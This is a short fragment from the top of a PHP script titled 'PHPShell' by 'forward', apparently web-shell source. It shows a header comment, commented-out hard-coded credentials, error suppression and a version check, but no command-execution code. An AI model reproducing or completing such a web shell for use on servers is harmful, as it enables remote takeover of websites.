...
/*
*****************************************************************************************
*                           PHPSHELL.PHP  Edited    April th 2007                *
***************************************************************************************** 
*                                                                                       *  
*   PHP Shell by forward                                              * 
...
//$http_auth_user = "sekip";	/* HTTP Authorisation username, uncomment if you want to use this */
//$http_auth_pass = "sekip123";	/* HTTP Authorisation password, uncomment if you want to use this */	    

error_reporting(0);
$PHPVer=phpversion();
$isGoodver=(intval($PHPVer[0])>=4);
$scriptTitle = "PHPShell";
$scriptident = "$scriptTitle by forward";
